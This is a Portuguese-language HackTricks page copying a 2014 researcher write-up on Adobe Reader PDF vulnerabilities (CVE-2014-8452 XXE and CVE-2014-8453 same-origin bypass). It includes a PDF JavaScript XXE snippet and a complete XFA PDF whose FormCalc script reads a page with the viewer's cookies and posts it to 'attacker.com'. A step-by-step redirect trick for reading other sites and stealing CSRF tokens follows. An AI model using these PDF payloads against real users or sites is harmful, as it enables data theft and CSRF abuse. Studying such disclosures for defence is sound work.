# Upload de PDF - Bypass de XXE e CORS

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o [reposit√≥rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

#### Conte√∫do copiado de [https://insert-script.blogspot.com/2014/12/multiple-pdf-vulnerabilites-text-and.html](https://insert-script.blogspot.com/2014/12/multiple-pdf-vulnerabilites-text-and.html)

### A fun√ß√£o Javascript no Reader pode ser usada para ler dados de entidades externas (CVE-2014-8452)

Status: Corrigido\
Realidade: N√£o corrigido\
\
Este √© sobre um simples XXE que descobri.\
Li o artigo "Polyglots: Crossing Origins by Crossing Formats", onde discutiram uma vulnerabilidade em\
XMLData.parse. Era poss√≠vel usar entidades externas e referenci√°-las.\
Li a especifica√ß√£o e descobri que existem mais fun√ß√µes do que "parse" para ler XML.\
Criei um arquivo xml simples, que referencia uma url do mesmo dom√≠nio e o analisei com loadXML.\
Funcionou:

![](https://4.bp.blogspot.com/-is4Q5hSZk-Y/VIwdzdAckWI/AAAAAAAAACI/OAzBs9Q-T50/s1600/xxe.png)
```
7 0 obj
<<
 /Type /Action
/S /JavaScript
/JS (
var cXMLDoc = '<?xml version="1.0" encoding="ISO-8859-1"?><foo>muh</foo>'
var cXMLDoc2 = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ENTITY aaaa SYSTEM "http://example.com">]><ab>&aaaa;</ab>'
xml = XMLData.parse(cXMLDoc,false);
xml.loadXML(cXMLDoc2,false,true);
)
>>
endobj
```
O impacto √© limitado porque\
o) √© limitado √† mesma origem\
o) as p√°ginas HTML quebram o xml\
o) Entidades din√¢micas n√£o s√£o suportadas\
o) Eu tive a ideia de usar um xml utf-16 para evitar quebrar a estrutura xml, mas n√£o funcionou.\
\
Mas ainda pode ser usado para ler JSON.

### Bypass da pol√≠tica de mesma origem no Reader (CVE-2014-8453)

Status: corrigido\
Realidade: corrigido, mas a mesma origem ainda √© vulner√°vel!\
\
Na minha opini√£o, esta √© a vulnerabilidade mais poderosa. Mesmo sem o Bypass de Origem, ela mostra\
o qu√£o poderoso/assustador o PDF pode ser.\
Muitas pessoas sabem que o PDF suporta uma linguagem de script chamada Javascript, mas h√° outra.\
√â mencionado na especifica√ß√£o para XFA, um tipo de arquivo tamb√©m suportado pelo leitor da Adobe.\
Chama-se formcalc e n√£o √© t√£o poderoso. √â usado para c√°lculos matem√°ticos simples. Mas na especifica√ß√£o da Adobe\
h√° tr√™s fun√ß√µes adicionais: 'GET', 'POST' e 'PUT'. Sim, seus nomes falam por si mesmos.\
'GET' tem um par√¢metro: uma url. Ele usar√° o navegador (SIM, COOKIES) para recuperar a url e retornar o conte√∫do dela.\
Podemos ent√£o usar 'POST' para enviar o conte√∫do retornado para nosso pr√≥prio servidor:\
\
var content = GET("meusamigos.php");\
Post("http://atacante.com",content);\
\
Essas fun√ß√µes s√£o da mesma origem, ent√£o um site precisa nos permitir fazer upload de um PDF. Isso n√£o √© t√£o irrealista para\
a maioria dos sites. Atacante.com n√£o √© da mesma origem, ent√£o voc√™ precisa configurar um crossdomain.xml, como de costume com produtos da Adobe.\
\
Para resumir: Isso n√£o √© um bug, √© um recurso. Assim que voc√™ √© permitido fazer upload de um PDF em um site,\
voc√™ pode acessar o site no contexto do usu√°rio que est√° visualizando o PDF. Como as solicita√ß√µes s√£o emitidas\
pelo navegador, os cookies tamb√©m s√£o enviados. Voc√™ tamb√©m pode us√°-lo para quebrar qualquer prote√ß√£o CSRF lendo os tokens.
```
% a PDF file using an XFA
% most whitespace can be removed (truncated to 570 bytes or so...)
% Ange Albertini BSD Licence 2012

% modified by insertscript

%PDF-1. % can be truncated to %PDF-\0

1 0 obj <<>>
stream
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config><present><pdf>
    <interactive>1</interactive>
</pdf></present></config>
<template>
    <subform name="_">
        <pageSet/>
        <field id="Hello World!">
            <event activity="initialize">
                <script contentType='application/x-formcalc'>
     var content = GET("myfriends.php");
                   Post("http://attacker.com",content);
                </script>
            </event>
        </field>
    </subform>
</template>
</xdp:xdp>
endstream
endobj

trailer <<
    /Root <<
        /AcroForm <<
            /Fields [<<
                /T (0)
                /Kids [<<
                    /Subtype /Widget
                    /Rect []
                    /T ()
                    /FT /Btn
                >>]
            >>]
            /XFA 1 0 R
        >>
        /Pages <<>>
    >>
>>
```
Depois de encontrar essas fun√ß√µes, encontrei uma forma de burlar a pol√≠tica de mesma origem. Isso torna poss√≠vel usar o navegador da v√≠tima como um proxy (@beef ainda est√° trabalhando no m√≥dulo^^).

A forma de burlar √© realmente simples:

1. O usu√°rio A carrega o evil.pdf de http://attacker.com/evil.pdf
2. O evil.pdf usa o formcalc GET para ler http://attacker.com/redirect.php
3. redirect.php redireciona com 301 para http://facebook.com
4. O Adobe reader seguir√° e ler√° a resposta sem procurar um crossdomain.xml.
5. O evil.pdf envia o conte√∫do recuperado via POST para http://attacker.com/log.php

Observe que, usando essa t√©cnica, voc√™ pode roubar os tokens CRSF de uma p√°gina e abusar das vulnerabilidades CSRF.

Essa simples forma de burlar foi corrigida agora. Espero que eles implementem um aviso de di√°logo para solicita√ß√µes de mesma origem tamb√©m.
